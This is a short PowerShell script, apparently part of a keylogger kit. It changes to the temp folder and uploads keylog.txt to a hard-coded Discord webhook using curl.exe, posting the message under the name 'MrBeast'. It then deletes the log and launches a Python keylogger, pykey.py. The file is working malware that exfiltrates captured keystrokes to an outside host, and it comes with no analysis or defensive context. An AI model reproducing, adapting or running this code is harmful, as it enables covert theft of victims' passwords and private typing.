#created by asimp


#webhook
$webhook = "https://discordapp.com/api/webhooks/1047984722875252807/hVISELqFsYlkRUkbYdWoONvvbG26bRxyk-gM1S-pAOejL4Vj-xQ6Iza8HpKHbMV8kpqt"

#cd into keylog dir

cd $env:temp 

#exfil keylog.txt
curl.exe -F "payload_json={\`"username\`": \`"MrBeast\`", \`"content\`": \`"Here are all the keys I typed last time\`"}" -F "file=@keylog.txt" $webhook

#deleting every previous keylog, to avoid massive files
del keylog.txt

#executing keylogger
./pykey.py
